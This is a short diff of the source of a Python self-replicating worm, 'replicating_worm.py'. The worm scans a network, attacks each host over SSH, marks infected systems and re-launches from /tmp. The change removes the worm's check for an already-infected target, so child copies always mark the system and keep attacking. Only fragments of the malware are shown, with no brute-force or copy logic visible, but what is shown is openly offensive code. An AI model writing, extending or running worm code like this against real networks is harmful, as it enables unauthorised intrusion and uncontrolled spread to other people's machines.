@@ -125,8 +125,6 @@ def startAttacking(wormLocation, isHost):
 	if isHost:
 		print network
 
-	markSystem()
-
 	for Host in network:
 		
 		sshInfo = attackHost(Host)
@@ -152,9 +150,8 @@ def main(argv):
 	elif argv[1] == "-host":
 		startAttacking("replicating_worm.py", True)
 	else:
-		if isTargetInfected() == False:
-			markSystem()
-			startAttacking("/tmp/replicating_worm.py", False)
+		markSystem()
+		startAttacking("/tmp/replicating_worm.py", False)
 	
 
 
